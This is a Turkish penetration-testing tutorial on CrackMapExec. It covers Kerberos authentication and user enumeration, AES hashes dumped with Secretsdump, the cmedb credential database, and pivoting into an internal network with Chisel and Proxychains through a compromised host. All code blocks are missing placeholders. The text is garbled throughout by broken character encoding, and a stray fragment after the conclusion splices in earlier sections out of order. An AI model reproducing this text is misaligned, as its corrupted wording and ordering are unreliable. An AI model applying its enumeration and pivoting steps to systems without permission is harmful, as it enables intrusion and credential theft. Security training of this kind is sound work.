5.3.0 sÃ¼rÃ¼mÃ¼nde yeni bir mod eklendi: `audit modu`. Bu mod, ÅŸifreyi veya hash'i tercih ettiÄŸimiz bir karakterle veya hatta en sevdiÄŸimiz `emoji` ile deÄŸiÅŸtirir. Bu Ã¶zellik, bir mÃ¼ÅŸteri raporu yazarken ekran gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼n bulanÄ±klaÅŸmasÄ±nÄ± Ã¶nlemeye yardÄ±mcÄ± olur.

Audit modunu yapÄ±landÄ±rmak iÃ§in, varsayÄ±lan olarak `~/.cme/cme.conf` adresinde bulunan yapÄ±landÄ±rma dosyasÄ±nÄ± dÃ¼zenlememiz ve `audit_mode` parametresini tercih ettiÄŸimiz karakterle deÄŸiÅŸtirmemiz gerekir. Bu karakter, CrackMapExec Ã§alÄ±ÅŸtÄ±rÄ±lÄ±rken parolanÄ±n veya hash'in yerini alacaktÄ±r. Bu Ã¶rnek iÃ§in `#` karakterini kullanacaÄŸÄ±z


### Enabling Audit Mode

{{CODE_BLOCK_237}}

Åimdi Ã§alÄ±ÅŸtÄ±rabilir ve parolanÄ±n Ã§Ä±ktÄ±da `########` ile deÄŸiÅŸtirildiÄŸini gÃ¶rebiliriz.

{{CODE_BLOCK_238}}

GÃ¶rdÃ¼ÄŸÃ¼mÃ¼z gibi, Ã§alÄ±ÅŸtÄ±rma sonucundaki password `#` karakteri ile deÄŸiÅŸtirilir. Ancak, komut ÅŸifreyi gÃ¶sterir. Bu gibi durumlarda, istenen komutu Ã§alÄ±ÅŸtÄ±rmadan Ã¶nce parolayÄ± bir dosyaya kaydetmek idealdir.

### Audit Mode Dosyadaki Parola ile EtkinleÅŸtirildi

{{CODE_BLOCK_239}}


### IPv6 Support

CrackMapExec'in bir diÄŸer yeteneÄŸi, IPv6 Ã¼zerinden iletiÅŸimi desteklemesidir. Ã‡oÄŸu organizasyon, IPv6'yÄ± varsayÄ±lan olarak etkinleÅŸtirmiÅŸtir, hatta bunu kullanmasalar bile, IPv6'nÄ±n log seviyesinde IPv4 kadar izlenmediÄŸi veya anlaÅŸÄ±lmadÄ±ÄŸÄ± durumlar da olabilir. Bu durum, aÄŸ saldÄ±rÄ±larÄ±nÄ±n gerÃ§ekleÅŸtirilmesi ve tespit edilmeden geÃ§mesi iÃ§in bir fÄ±rsat yaratÄ±r.

PopÃ¼ler modÃ¼ller bÃ¶lÃ¼mÃ¼nde gÃ¶rdÃ¼ÄŸÃ¼mÃ¼z gibi, CrackMapExec, `get_netconnections` modÃ¼lÃ¼yle bilgisayarlarÄ±n IPv6 adreslerini belirlememize olanak tanÄ±r. Bu modÃ¼lÃ¼ kullanarak IPv6 Ã¼zerinden komutu Ã§alÄ±ÅŸtÄ±rmayÄ± deneyelim.

### get_netconnections ModÃ¼lÃ¼nÃ¼ Ã‡alÄ±ÅŸtÄ±rma ve IPv6 Kullanma

{{CODE_BLOCK_240}}

Åimdi IPv6 Ã¼zerinden hedefe eriÅŸelim.

{{CODE_BLOCK_241}}



### Tamamlanma YÃ¼zdesi

ArtÄ±k bir tarama Ã§alÄ±ÅŸÄ±rken enter tuÅŸuna basabilirsiniz ve CME size tamamlanma yÃ¼zdesini ve taranacak kalan host sayÄ±sÄ±nÄ± verecektir. Bu modÃ¼l laboratuvarÄ±nda her seferinde bir host'a saldÄ±rÄ±yoruz, ancak daha kapsamlÄ± bir aÄŸ bulduÄŸunuzda, bÃ¼yÃ¼k olasÄ±lÄ±kla bu Ã¶zelliÄŸi kullanacaksÄ±nÄ±z. Åimdilik `--shares` seÃ§eneÄŸini Ã§alÄ±ÅŸtÄ±ralÄ±m ve bitmeden Ã¶nce enter tuÅŸuna basalÄ±m.


### Tamamlanma YÃ¼zdesi

{{CODE_BLOCK_242}}

AÅŸaÄŸÄ±daki bÃ¶lÃ¼mde, Kerberos kimlik doÄŸrulamasÄ±nÄ± ve CrackMapExec'in bu kimlik doÄŸrulama yÃ¶ntemi iÃ§in iÃ§erdiÄŸi yeni deÄŸiÅŸiklikleri tartÄ±ÅŸacaÄŸÄ±z.

---


### Kerberos Authentication

Yazma sÄ±rasÄ±nda CrackMapEec, `SMB`, `LDAP` ve `MSSQL` protokolleri iÃ§in Kerberos Kimlik DoÄŸrulamasÄ±nÄ± desteklemektedir. Kerberos Kimlik DoÄŸrulamasÄ±nÄ± kullanmanÄ±n iki (2) yolu vardÄ±r:

* `ccache` dosyasÄ±nÄ± belirtmek iÃ§in `KRB5CCNAME` env adÄ±nÄ± kullanma. 
* CrackMapExec 5.4.0'dan baÅŸlayarak, artÄ±k Kerberos kimlik doÄŸrulamasÄ± iÃ§in bir Ticketla `KRB5CCNAME` environment variable'Ä±nÄ± kullanmamÄ±z gerekmiyor. Bir kullanÄ±cÄ± adÄ± ve parola veya kullanÄ±cÄ± adÄ± ve hash kullanabiliriz.

Linux'ta Kerberos kimlik doÄŸrulamasÄ±nÄ± kullanÄ±rken gÃ¶z Ã¶nÃ¼nde bulundurulmasÄ± gereken Ã¶nemli bir unsur, saldÄ±rdÄ±ÄŸÄ±mÄ±z bilgisayarÄ±n domain ve hedef makinenin `FQDN`'sini Ã§Ã¶zÃ¼mlemesi gerektiÄŸidir. Ä°nternal bir aÄŸdaysak, bilgisayarÄ±mÄ±zÄ± ÅŸirketin DNS'sine domain adÄ± Ã§Ã¶zÃ¼mlemeleri yapacak ÅŸekilde yapÄ±landÄ±rabiliriz, ancak durum bÃ¶yle deÄŸildir. DNS'i yapÄ±landÄ±ramayÄ±z ve `/etc/hosts` dosyasÄ±na domain controller ve hedef makinemiz iÃ§in FQDN'i manuel olarak eklememiz gerekecektir.


### Setting Up the /etc/hosts File

{{CODE_BLOCK_243}}

{{CODE_BLOCK_244}}

CrackMapExec'i Kerberos kimlik doÄŸrulamasÄ± ile kullanmayÄ± deneyelim.

### Username and Password - Kerberos Authentication

CrackMapExec'i `-k` veya `--kerberos` seÃ§eneÄŸi olmadan bir kullanÄ±cÄ± adÄ± ve parola veya kullanÄ±cÄ± adÄ± ve hash ile kullandÄ±ÄŸÄ±mÄ±zda, NTLM kimlik doÄŸrulamasÄ± gerÃ§ekleÅŸtiririz. Kerberos seÃ§eneÄŸini kullanÄ±rsak bunun yerine Kerberos kimlik doÄŸrulamasÄ±nÄ± kullanabiliriz.

### Kerberos Authentication

{{CODE_BLOCK_245}}




### Kerberos Kimlik DoÄŸrulamasÄ± ile KullanÄ±cÄ±larÄ± TanÄ±mlama

Yeni Kerberos kimlik doÄŸrulama uygulamasÄ± ile CrackMapExec, CME iÃ§inde kendi `Kerbrute`'unu oluÅŸturmak iÃ§in tÃ¼m bileÅŸenlere sahiptir. Bu, CME'nin bir kullanÄ±cÄ±nÄ±n domain Ã¼zerinde var olup olmadÄ±ÄŸÄ±nÄ± ve bu kullanÄ±cÄ±nÄ±n Kerberos `pre-authentication` (`ASREPRoasting`) gerektirmeyecek ÅŸekilde yapÄ±landÄ±rÄ±lÄ±p yapÄ±landÄ±rÄ±lmadÄ±ÄŸÄ±nÄ± anlayabileceÄŸi anlamÄ±na gelir. Bunu aÅŸaÄŸÄ±daki hesaplarla Ã§alÄ±ÅŸÄ±rken gÃ¶relim: `account_not_exist` , `julio` , ve `robert` .


### Kerberos Kimlik DoÄŸrulamasÄ± ile KullanÄ±cÄ±larÄ± TanÄ±mlama

{{CODE_BLOCK_246}}

GÃ¶rdÃ¼ÄŸÃ¼mÃ¼z gibi, `Kerbrute` CrackMapExec TGT isteklerini Ã¶n kimlik doÄŸrulamasÄ± olmadan gÃ¶nderdiÄŸinden, KDC bir KDC_ERR_C_PRINCIPAL_UNKNOWN hatasÄ±yla yanÄ±t verirse, kullanÄ±cÄ± adÄ± mevcut deÄŸildir. Ancak, KDC pre-authentication isterse, `KDC_ERR_PREAUTH_FAILED` hatasÄ±yla yanÄ±t verir, bu da kullanÄ±cÄ± adÄ±nÄ±n mevcut olduÄŸu anlamÄ±na gelir. Son olarak, `asreproast` saldÄ±rÄ±sÄ±na karÅŸÄ± savunmasÄ±z bir hata hesabÄ± gÃ¶rÃ¼rsek, daha Ã¶nce `AESREPRoast` HesaplarÄ±nÄ± Bulma bÃ¶lÃ¼mÃ¼nde gÃ¶rdÃ¼ÄŸÃ¼mÃ¼z gibi AESREPoast saldÄ±rÄ±larÄ±na karÅŸÄ± hassastÄ±r.

Bu, oturum aÃ§ma hatalarÄ±na neden olmaz, bu nedenle herhangi bir hesabÄ± kilitlemez, ancak Kerberos logu etkinleÅŸtirilmiÅŸse [4768](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4768) numaralÄ± bir Windows olay kimliÄŸi oluÅŸturur.


### AES-128 veya AES-256 kullanma

AyrÄ±ca, Kerberos Kimlik DoÄŸrulamasÄ± iÃ§in AES-128 veya AES-256 hash'leri de kullanabiliriz. `Impacket`'ten `Secretsdump` gibi araÃ§lar, genellikle bu tÃ¼r hash'leri alabilir. AES-128 veya AES-256 kullandÄ±ÄŸÄ±mÄ±zda, trafiÄŸimiz normal Kerberos trafiÄŸine daha Ã§ok benzeyecek ve bu da operasyonel bir avantaj (opsec) saÄŸlayacaktÄ±r. Hadi Secretsdump'u kullanalÄ±m ve ardÄ±ndan AES256 ile kimlik doÄŸrulamasÄ± yapalÄ±m.


### AES256 ile Kimlik DoÄŸrulama

{{CODE_BLOCK_247}}

{{CODE_BLOCK_248}}


### CCache file - Kerberos Authentication

Bir credential cache (veya [ccache](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) ) Kerberos kimlik bilgilerini tutar. Genellikle kullanÄ±cÄ±nÄ±n oturumu sÃ¼rdÃ¼ÄŸÃ¼ sÃ¼rece geÃ§erli kalÄ±rlar, bu nedenle servislere birden fazla kez kimlik doÄŸrulamasÄ± yapmak (Ã¶rneÄŸin, bir web veya posta sunucusuna birden fazla kez baÄŸlanmak) her seferinde KDC ile iletiÅŸim kurmayÄ± gerektirmez.

Ã‡oÄŸu durumda, Linux makineleri Kerberos tickerlarÄ± ccache dosyalarÄ± olarak depolar, sistemlerin ticketlarÄ± kullanma ÅŸekli, `ccache` dosyasÄ±nÄ±n yolunu gÃ¶steren `KRB5CCNAME` environment variable aracÄ±lÄ±ÄŸÄ±yla olur. robert kullanÄ±cÄ±sÄ± iÃ§in bir ticket (ccache dosyasÄ±) oluÅŸturalÄ±m ve DC01'e kimlik doÄŸrulamasÄ± yapalÄ±m

Ticket'Ä± oluÅŸturmak iÃ§in [getTGT.py](https://github.com/fortra/impacket/blob/master/examples/getTGT.py) impacket aracÄ±nÄ± kullanacaÄŸÄ±z ve KRB5CCNAME environment variable'i getTGT.py tarafÄ±ndan oluÅŸturulan ccache dosyasÄ±nÄ±n yoluna ayarlayacaÄŸÄ±z.


### Ticket Granting Tickets

{{CODE_BLOCK_249}}

{{CODE_BLOCK_250}}

Kerberos kimlik doÄŸrulama yÃ¶ntemimiz olarak `KRB5CCNAME` environment variable'ini kullanmak iÃ§in `--use-kcache` seÃ§eneÄŸini kullanmamÄ±z gerekir. KullanÄ±cÄ± adÄ± ve parola seÃ§enekleri gerekli deÄŸildir.


### ccache DosyasÄ±nÄ± Kerberos Kimlik DoÄŸrulama YÃ¶ntemi Olarak Kullanma (SMB ProtokolÃ¼)

{{CODE_BLOCK_251}}


### Kerberos Kimlik DoÄŸrulama YÃ¶ntemi Olarak ccache DosyasÄ±nÄ±n KullanÄ±lmasÄ± (LDAP ProtokolÃ¼)

{{CODE_BLOCK_252}}

Kerberos Kimlik DoÄŸrulamasÄ±nÄ± `MSSQL` protokolÃ¼ ile kullanmak iÃ§in hedef olarak IP adresi yerine bilgisayar adÄ±nÄ± veya FQDN'yi belirtmemiz gerekir. Bunun nedeni, MSSQL protokolÃ¼nÃ¼n perde arkasÄ±nda IP'yi FQDN'ye dÃ¶nÃ¼ÅŸtÃ¼rmemesi, ancak SMB ve LDAP protokollerinin bunu yapmasÄ±dÄ±r.


### MSSQL ProtokolÃ¼ ile ccache DosyasÄ±nÄ± Kullanma

{{CODE_BLOCK_253}}

KullanÄ±cÄ± adlarÄ± ve parolalarla yaptÄ±ÄŸÄ±mÄ±z gibi Kerberos kimlik doÄŸrulamasÄ± ile herhangi bir modÃ¼lÃ¼ veya seÃ§eneÄŸi Ã§alÄ±ÅŸtÄ±rabiliriz


### Kerberos Kimlik DoÄŸrulamasÄ± ile PaylaÅŸÄ±mlarÄ± Listeleme


{{CODE_BLOCK_254}}


CrackMapExec ile Kerberos Authentication'Ä±n nasÄ±l kullanÄ±lacaÄŸÄ±nÄ± Ã¶ÄŸrendik. AÅŸaÄŸÄ±daki bÃ¶lÃ¼mde, CrackMapExec veritabanÄ± `cmedb` ile etkileÅŸime gireceÄŸiz

---


### CMEDB'de UzmanlaÅŸmak

CME otomatik olarak tÃ¼m kullanÄ±lan/dump edilen kimlik bilgilerini (diÄŸer bilgilerle birlikte) ilk Ã§alÄ±ÅŸtÄ±rmada kurulan `SQLite` veritabanÄ±nda saklar. TÃ¼m Ã§alÄ±ÅŸma alanlarÄ± ve ilgili veritabanlarÄ± `~/.cme/workspaces` iÃ§inde saklanÄ±r. VarsayÄ±lan veritabanlarÄ± `~/.cme/workspaces/default` dizininde bulunur. Bu dizinde her protokol iÃ§in bir SQLite dosyasÄ± bulunur.


### VarsayÄ±lan VeritabanlarÄ±nÄ± Listeleme

{{CODE_BLOCK_255}}

### VeritabanÄ± ile EtkileÅŸim

CME, back-end veritabanÄ± ile etkileÅŸimi kolaylaÅŸtÄ±ran ikinci bir komut satÄ±rÄ± script'i olan `cmedb` ile birlikte gelir. cmedb komutunu yazmak bizi bir komut shell'i gÃ¶tÃ¼recektir:

### CMEDB

{{CODE_BLOCK_256}}


### Workspaces

VarsayÄ±lan workspace adÄ± `default` olarak adlandÄ±rÄ±lÄ±r (bilgi `prompt` gÃ¶sterildiÄŸi gibi). Bir workspace seÃ§ildiÄŸinde, CME'de yaptÄ±ÄŸÄ±mÄ±z her ÅŸey bu workspace'de saklanacaktÄ±r. Bir workspace oluÅŸturmak iÃ§in, `cmedb (default) >` komut promt root'una gitmemiz gerekir. EÄŸer protokol veritabanÄ±ndaysak, geri komutunu kullanmamÄ±z gerekir.


### Creating a Workspace

{{CODE_BLOCK_257}}

Workspace'leri listelemek iÃ§in `workspace list` , workspace'i deÄŸiÅŸtirmek iÃ§in ise `workspace <workspace>` yazabiliriz.


### Workspace'leri Listeleme ve DeÄŸiÅŸtirme

{{CODE_BLOCK_258}}


### Bir ProtokolÃ¼n VeritabanÄ±na EriÅŸim

cmedb her protokol iÃ§in bir veritabanÄ±na sahiptir, ancak bu modÃ¼lÃ¼n yazÄ±ldÄ±ÄŸÄ± sÄ±rada yalnÄ±zca `SMB` ve `MSSQL` yararlÄ± seÃ§eneklere sahiptir:

| Protokol | SeÃ§enekler                                         |
| -------- | -------------------------------------------------- |
| SMB      | back exit export import groups hosts import shares |
| MSSQL    | back exit export import host import                |
| LDAP     | back exit export import                            |
| WinRM    | back exit export import                            |
| RDP      | back exit export import                            |
| FTP      | back exit export import                            |
| SSH      | back exit export import                            |

Bir protokolÃ¼n veritabanÄ±na eriÅŸmek iÃ§in `proto` `<protocol>` komutunu Ã§alÄ±ÅŸtÄ±rÄ±n. Protokol iÃ§inde, mevcut seÃ§enekleri gÃ¶rÃ¼ntÃ¼lemek iÃ§in `help` seÃ§eneÄŸini kullanabiliriz:

### SMB Protokol VeritabanÄ±na BaÄŸlanma

{{CODE_BLOCK_259}}


### Protocol Options

SMB veya MSSQL protokolÃ¼nÃ¼ her kullandÄ±ÄŸÄ±mÄ±zda, kimlik bilgileri, saldÄ±rdÄ±ÄŸÄ±mÄ±z hostlar, eriÅŸtiÄŸimiz paylaÅŸÄ±mlar ve listelediÄŸimiz gruplar CrackMapExec veritabanÄ±nda saklanÄ±r. VeritabanÄ±nda sahip olduÄŸumuz verilere eriÅŸelim.

### Kimlik Bilgilerini GÃ¶rÃ¼ntÃ¼leme

CrackMapExec veritabanÄ±, CrackMapExec kullanarak kullandÄ±ÄŸÄ±mÄ±z veya elde ettiÄŸimiz tÃ¼m kimlik bilgilerini depolar. Bu veritabanÄ±, kimlik bilgilerinin tÃ¼rÃ¼nÃ¼, `dÃ¼z metin` veya `hash` olup olmadÄ±ÄŸÄ±nÄ±, domain, kullanÄ±cÄ± adÄ± ve ÅŸifreyi saklar. SMB protokolÃ¼nÃ¼n kimlik bilgilerini gÃ¶rmek iÃ§in protokol iÃ§indeki `creds` seÃ§eneÄŸini kullanmamÄ±z gerekir.


### Displaying SMB Credentials

{{CODE_BLOCK_260}}


GÃ¶rdÃ¼ÄŸÃ¼nÃ¼z gibi, creds'ten sonra bir `kullanÄ±cÄ± adÄ±` ekleyerek belirli kullanÄ±cÄ±larÄ± da sorgulayabiliriz. AyrÄ±ca `creds hash` seÃ§eneÄŸi ile tÃ¼m hash'leri veya `creds plaintext` seÃ§eneÄŸi ile tÃ¼m plaintext kimlik bilgilerini listeleyebiliriz.


### Hash'leri ve DÃ¼z Metin Kimlik Bilgilerini GÃ¶rÃ¼ntÃ¼leme

{{CODE_BLOCK_261}}


Not: cmedb, mevcut seÃ§enekleri gÃ¶rÃ¼ntÃ¼lemek iÃ§in sekme otomatik tamamlamaya izin verir

MSSQL kimlik bilgileri MSSQL protokolÃ¼ne kaydedilir ve SMB kimlik bilgilerini gÃ¶rÃ¼ntÃ¼lediÄŸimiz gibi gÃ¶rÃ¼ntÃ¼lenebilir


### MSSQL iÃ§in Kimlik Bilgilerini GÃ¶rÃ¼ntÃ¼leme

{{CODE_BLOCK_262}}

Not: Domain alanÄ±nÄ± bir bilgisayar ile gÃ¶rÃ¼yorsak, bu bir MSSQL hesabÄ± kullandÄ±ÄŸÄ±mÄ±z anlamÄ±na gelir.

### Kimlik Bilgilerini Kullanma

CrackMapExec'i Ã§alÄ±ÅŸtÄ±rmak iÃ§in veritabanÄ±ndaki kimlik bilgilerini de kullanabiliriz. Kullanmak istediÄŸimiz kimlik bilgilerini tanÄ±mlamamÄ±z ve hangi id'nin hesapla iliÅŸkili olduÄŸunu belirlememiz gerekir. `Julio`'nun kimlik bilgilerini `id 4` ile kullanalÄ±m. KullanÄ±cÄ± adÄ± ve parola yerine bir kimlik bilgisi kullanmak iÃ§in `-id CredID` seÃ§eneÄŸini kullanmamÄ±z gerekir.

### CrackMapExec ile EtkileÅŸim iÃ§in CredID KullanÄ±mÄ±

{{CODE_BLOCK_263}}


### Hosts Information

MSSQL ve SMB iÃ§in, eriÅŸim saÄŸladÄ±ÄŸÄ±mÄ±z bilgisayarlarÄ±, IP'lerini, domainlerini ve iÅŸletim sistemlerini de belirleyebiliriz.


### Displaying Hosts

{{CODE_BLOCK_264}}


### Share Information

CME veritabanÄ± da belirlediÄŸimiz paylaÅŸÄ±mlÄ± klasÃ¶rleri saklÄ±yor ve okuma ve yazma eriÅŸimine sahip kullanÄ±cÄ±larÄ±mÄ±z olup olmadÄ±ÄŸÄ±nÄ± bize sÃ¶ylÃ¼yor. PaylaÅŸÄ±m bilgilerine eriÅŸmek iÃ§in `cmedb` iÃ§erisinde SMB protokolÃ¼ iÃ§erisinde `shares` seÃ§eneÄŸini kullanmamÄ±z gerekiyor.

### PaylaÅŸÄ±mlarÄ± Geri Alma

{{CODE_BLOCK_265}}


### KullanÄ±cÄ± Ekleme ve KaldÄ±rma

CME, kullanÄ±cÄ±larÄ± veritabanÄ±ndan manuel olarak ekleme veya kaldÄ±rma Ã¶zelliÄŸini destekler. ProtokolÃ¼ (SMB veya MSSQL) seÃ§iyoruz ve `creds add` veya `creds remove` kullanÄ±yoruz.


### cmedb'ye KullanÄ±cÄ± Ekleme

{{CODE_BLOCK_266}}

Åimdi eklediÄŸimiz kullanÄ±cÄ±yÄ± kaldÄ±rmayÄ± deneyebiliriz.

### Bir KullanÄ±cÄ±yÄ± cmedb'den KaldÄ±rma

{{CODE_BLOCK_267}}


### Empire Kimlik Bilgilerini Ä°mport Etme

cmedb'nin sahip olduÄŸu bir baÅŸka Ã¶zellik de `Empire`'dan kimlik bilgilerini import etme yeteneÄŸidir.


### Import from Empire

{{CODE_BLOCK_268}}

Not: Bu Ã¶zelliÄŸi kullanmak istiyorsanÄ±z `Empire`'Ä± yapÄ±landÄ±rdÄ±ÄŸÄ±nÄ±zdan emin olun

### Export cmedb Data

CrackMapExec veritabanÄ±ndan kimlik bilgilerini, hostlarÄ±, local adminleri ve paylaÅŸÄ±mlarÄ± export edebiliriz.

### Kimlik Bilgilerini cmedb'den Export Etme

{{CODE_BLOCK_269}}

{{CODE_BLOCK_270}}

Veriler CSV dosyasÄ± olarak dÄ±ÅŸa aktarÄ±lÄ±r. `LibreOffice` veya `Excel` gibi araÃ§larÄ± kullanarak aÃ§abiliriz.

![Pasted image 20241203155509.png](/img/user/resimler/Pasted%20image%2020241203155509.png)


### Son

CrackMapExec, aÄŸ gÃ¼venliÄŸi testlerinde ve sÄ±zma testlerinde kullanÄ±cÄ±larÄ±n iÅŸini kolaylaÅŸtÄ±ran, etkili bir araÃ§tÄ±r. GeniÅŸ protokol desteÄŸi, hÄ±zlÄ± keÅŸif, gÃ¼venlik aÃ§Ä±klarÄ± tespiti ve yÃ¶netimsel haklar elde etme gibi Ã§eÅŸitli Ã¶zellikleriyle gÃ¼venlik profesyonellerinin vazgeÃ§ilmez araÃ§larÄ± arasÄ±nda yer alÄ±r. Bu araÃ§, aÄŸ yapÄ±larÄ±nÄ±n daha gÃ¼venli hale getirilmesi iÃ§in Ã¶nemli bir rol oynar ve her gÃ¼venlik uzmanÄ±nÄ±n repertuarÄ±nda bulunmasÄ± gereken bir araÃ§tÄ±r.


, 'print

Dizine gidebilir ve kullanÄ±cÄ±nÄ±n eriÅŸebileceÄŸi tÃ¼m dosyalarÄ±n bir listesini alabiliriz:


### KullanÄ±cÄ±nÄ±n KullanabileceÄŸi DosyalarÄ± Listeleme

{{CODE_BLOCK_94}}

EÄŸer paylaÅŸÄ±mÄ±n tÃ¼m iÃ§eriÄŸini indirmek istiyorsak `READ_ONLY=false` seÃ§eneÄŸini aÅŸaÄŸÄ±daki gibi kullanabiliriz:

{{CODE_BLOCK_95}}

{{CODE_BLOCK_96}}

Not: SabÄ±rlÄ± olmamÄ±z gerekiyor. PaylaÅŸÄ±lan klasÃ¶r ve dosya sayÄ±sÄ±na baÄŸlÄ± olarak iÅŸlem birkaÃ§ dakika sÃ¼rebilir

`spider_plus` modÃ¼lÃ¼ iÃ§in mevcut tÃ¼m seÃ§enekleri gÃ¶rÃ¼ntÃ¼lemek iÃ§in `--options` seÃ§eneÄŸini kullanabiliriz:


### Spider_plus Options

{{CODE_BLOCK_97}}

Bir sonraki bÃ¶lÃ¼mde CrackMapExec'in bir `proxy` aracÄ±lÄ±ÄŸÄ±yla diÄŸer aÄŸlara ulaÅŸmak iÃ§in nasÄ±l kullanÄ±lacaÄŸÄ± anlatÄ±lacaktÄ±r.


---


### Proxychains with CME

### Scenario

Ä°nternal bir Pentest Ã¼zerinde Ã§alÄ±ÅŸÄ±yoruz. Bir aÄŸ taramasÄ± gerÃ§ekleÅŸtirdik ve yalnÄ±zca bir host (10.129.204.133) tespit edip ele geÃ§irebildik. Ele geÃ§irilen bu host Ã¼zerinde `ipconfig` Ã§alÄ±ÅŸtÄ±rdÄ±ÄŸÄ±mÄ±zda, iki aÄŸ baÄŸdaÅŸtÄ±rÄ±cÄ±sÄ± olduÄŸunu fark ettik. ARP tablosu `172.16.1.10` IP adresine sahip baÅŸka bir hostu gÃ¶steriyor. TopladÄ±ÄŸÄ±mÄ±z bilgilere dayanarak aÅŸaÄŸÄ±daki senaryoya sahibiz:

![Pasted image 20241202141946.png](/img/user/resimler/Pasted%20image%2020241202141946.png)

DC01'e ve bu aÄŸdaki (172.16.1.0/24) herhangi bir makineye saldÄ±rmak iÃ§in, saldÄ±rÄ± hostumuz ile MS01 arasÄ±nda bir `tÃ¼nel` kurmalÄ±yÄ±z. Bu nedenle, CME tarafÄ±ndan yÃ¼rÃ¼tÃ¼len tÃ¼m komutlar MS01 Ã¼zerinden geÃ§er.


### Set Up the Tunnel

TÃ¼nelimizi kurmak iÃ§in [Chisel](https://github.com/jpillora/chisel) kullanacaÄŸÄ±z. [Release](https://github.com/jpillora/chisel/releases)'e gidelim ve saldÄ±racaÄŸÄ±mÄ±z makinemiz iÃ§in en son Windows binary'sini ve saldÄ±rÄ± hostumuzda kullanmak iÃ§in en yeni Linux binary'sini indirelim ve aÅŸaÄŸÄ±daki adÄ±mlarÄ± gerÃ§ekleÅŸtirelim:

*  Chisel'Ä± SaldÄ±rÄ± Hostumuza indirin ve Ã‡alÄ±ÅŸtÄ±rÄ±n:

### Chisel - Reverse Tunnel

{{CODE_BLOCK_98}}


*  Chisel for Windows'u Ä°ndirin ve Hedef Host'a YÃ¼kleyin:


### Upload Chisel

{{CODE_BLOCK_99}}


* CrackMapExec komut yÃ¼rÃ¼tme seÃ§eneÄŸi `-x`'i kullanarak Chisel sunucumuza baÄŸlanmak iÃ§in `chisel.exe` dosyasÄ±nÄ± Ã§alÄ±ÅŸtÄ±rÄ±n (Bu seÃ§eneÄŸi Komut YÃ¼rÃ¼tme bÃ¶lÃ¼mÃ¼nde daha fazla tartÄ±ÅŸacaÄŸÄ±z)


### Connect to the Chisel Server

{{CODE_BLOCK_100}}

Bu terminaldeki komut, hedef makinadaki **Chisel** process'ini durdurana kadar Ã§alÄ±ÅŸmaya devam edecektir. Bunu bu bÃ¶lÃ¼mde daha sonra yapacaÄŸÄ±z.

**Attack host** Ã¼zerinde, **Chisel server** Ã§Ä±ktÄ±sÄ±nda **bir client baÄŸlantÄ±sÄ± aldÄ±ÄŸÄ±mÄ±zÄ± ve tÃ¼neli baÅŸlattÄ±ÄŸÄ±mÄ±zÄ±** gÃ¶steren yeni bir satÄ±r gÃ¶rmeliyiz.

### Chisel Receiving Session No. 1

{{CODE_BLOCK_101}}

TCP 1080 portunun dinlenip dinlenmediÄŸini kontrol ederek de tÃ¼nelin Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ± doÄŸrulayabiliriz:


### Check Listening Port

{{CODE_BLOCK_102}}

* Proxyychains'i Chisel varsayÄ±lan portu `TCP 1080`'i kullanacak ÅŸekilde yapÄ±landÄ±rmamÄ±z gerekir. YapÄ±landÄ±rma dosyasÄ±nÄ±n ProxyList bÃ¶lÃ¼mÃ¼ne `socks5 127.0.0.1 1080`'i aÅŸaÄŸÄ±daki gibi eklediÄŸimizden emin olmamÄ±z gerekiyor:


### Configure Proxychains

{{CODE_BLOCK_103}}

* ArtÄ±k 172.16.1.10 IP'sine ulaÅŸmak iÃ§in `Proxychains` aracÄ±lÄ±ÄŸÄ±yla CrackMapExec'i kullanabiliriz:

### CrackMapExec'in Proxychains ile Test Edilmesi

{{CODE_BLOCK_104}}


Proxychains Ã§Ä±ktÄ±sÄ±nÄ± konsoldan kaldÄ±rmak iÃ§in `Proxychains4` ve `quiet -q` seÃ§eneÄŸini kullanabiliriz:

### Quiet SeÃ§eneÄŸi ile Proxychains4

{{CODE_BLOCK_105}}

Proxychains aracÄ±lÄ±ÄŸÄ±yla herhangi bir CME iÅŸlemi gerÃ§ekleÅŸtirebiliriz.


### Killing Chisel on the Target Machine

Ä°ÅŸimiz bittiÄŸinde, Chisel process'ini kill etmemiz gerekir. Bunu yapmak iÃ§in, PowerShell komutlarÄ±nÄ± yÃ¼rÃ¼tmek iÃ§in `-X` seÃ§eneÄŸini kullanacaÄŸÄ±z ve PowerShell komutunu Ã§alÄ±ÅŸtÄ±racaÄŸÄ±z `Stop-Process - Name chisel -Force .` Komut yÃ¼rÃ¼tme konusunu Komut YÃ¼rÃ¼tme bÃ¶lÃ¼mÃ¼nde daha ayrÄ±ntÄ±lÄ± olarak ele alacaÄŸÄ±z.


### Kill the Chisel Client

{{CODE_BLOCK_106}}

Bunu yaptÄ±ktan sonra, Chisel client komutunu Ã§alÄ±ÅŸtÄ±rdÄ±ÄŸÄ±mÄ±z terminal aÅŸaÄŸÄ±daki gibi sonuÃ§lanmalÄ±dÄ±r:


### Chisel'i Zorla Durdurduktan Sonra Terminalin KapanmasÄ±

{{CODE_BLOCK_107}}

ArtÄ±k saldÄ±rÄ± konaÄŸÄ±mÄ±zdaki Chisel sunucusunu CTRL + C ile kapatabiliriz.


### Attack Host Ãœzerinde Chisel'i Kapatma

{{CODE_BLOCK_108}}


### Sunucu olarak Windows ve Client olarak Linux

Chisel'i Windows workstation'da bir sunucu olarak baÅŸlatarak ve saldÄ±rÄ± hostumuzu client olarak kullanarak bunun tersini de yapabiliriz. Chisel'i sunucu olarak baÅŸlatmak iÃ§in `server --socks5` seÃ§eneÄŸini kullanacaÄŸÄ±z.


### Chisel'i Hedef Makinede Sunucu Olarak BaÅŸlatma

{{CODE_BLOCK_109}}

Åimdi hedef makinemiz Chisel sunucusuna baÄŸlanmak ve proxy'yi etkinleÅŸtirmek iÃ§in IP ve porttan sonra `socks` seÃ§eneÄŸini kullanmamÄ±z gerekiyor.


### Attack Hostumuzdan Chisel Sunucusuna BaÄŸlanma

{{CODE_BLOCK_110}}

Åimdi Proxychains'i tekrar kullanabiliriz:

### Internal Network'e BaÄŸlanmak iÃ§in Proxy Chain'i Kullanma

{{CODE_BLOCK_111}}

Bu bÃ¶lÃ¼mde, **attack host** Ã¼zerinde **Proxychains** ve **Chisel** yapÄ±landÄ±rmayÄ± ve **CrackMapExec** kullanarak hedef makinede **Chisel** Ã§alÄ±ÅŸtÄ±rmayÄ± Ã¶ÄŸrendik.

